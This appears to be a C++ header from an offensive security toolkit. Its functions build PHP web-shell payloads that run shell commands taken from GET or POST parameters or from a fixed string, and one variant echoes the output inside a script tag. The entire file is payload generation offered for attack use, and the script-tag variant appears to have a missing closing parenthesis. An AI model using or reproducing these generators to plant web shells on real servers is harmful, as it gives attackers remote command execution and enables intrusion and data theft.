#pragma once

#include "murk/flows/string.hpp"

#include <fmt/format.h>

namespace murk::plod {
  inline std::string php_get_shell(std::string_view param = "cmd") {
    return fmt::format("<?php echo shell_exec($_GET['{}']);?>", param);
  }
  inline std::string php_post_shell(std::string_view param = "cmd") {
    return fmt::format("<?php echo shell_exec($_POST['{}']);?>", param);
  }
  inline std::string php_shell(std::string_view vector) {
    return fmt::format("<?php echo shell_exec(\"{}\");?>", escape_double_quotes(vector));
  }
  inline std::string php_get_shell_clear(std::string_view param = "cmd") {
    return fmt::format("<script>document.onload = function() {{ document.write(<?php echo json_encode(shell_exec($_GET['{}']));?>}}</script>", param);
  }
}
